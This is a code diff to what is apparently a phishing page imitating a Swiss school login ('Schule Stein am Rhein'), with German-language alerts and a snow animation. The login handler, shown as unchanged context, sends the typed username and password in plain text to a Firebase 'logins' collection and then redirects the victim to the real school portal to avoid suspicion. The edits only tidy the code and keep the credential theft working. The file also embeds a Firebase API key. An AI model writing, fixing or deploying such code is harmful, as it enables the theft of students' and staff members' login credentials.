@@ -87,7 +87,7 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-    /* ---------------- Firebase ---------------- */
+    // Firebase configuration
     const firebaseConfig = {
       apiKey: "AIzaSyBpuVs9M1vUhR9OXahdm4vhpZMrKl9KuGI",
       authDomain: "ertee-fc073.firebaseapp.com",
@@ -105,18 +105,19 @@
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
 
+    // Login handler (NO illegal return outside function)
     loginBtn.addEventListener('click', () => {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
 
       if (!username || !password) {
         alert('Benutzername und Passwort sind erforderlich');
-        return;
+        return; // valid: inside event callback
       }
 
       push(ref(database, 'logins'), {
-        username,
-        password,
+        username: username,
+        password: password,
         school: 'Schule Stein am Rhein',
         createdAt: new Date().toISOString()
       })
@@ -124,15 +125,16 @@
         alert('Daten erfolgreich gespeichert ✅');
         window.location.href = 'https://www.escola.ch/';
       })
-      .catch(err => alert('Firebase Fehler ❌: ' + err.message));
+      .catch(err => {
+        alert('Firebase Fehler ❌: ' + err.message);
+      });
     });
 
-    /* ---------------- Snow Animation ---------------- */
+    // Snow animation (panel only)
     const canvas = document.getElementById('snow-canvas');
     const ctx = canvas.getContext('2d');
     const panel = document.getElementById('xmas-panel');
 
-    // IMPORTANT: flakes must be initialized BEFORE resize()
     const flakes = [];
 
     function resize() {
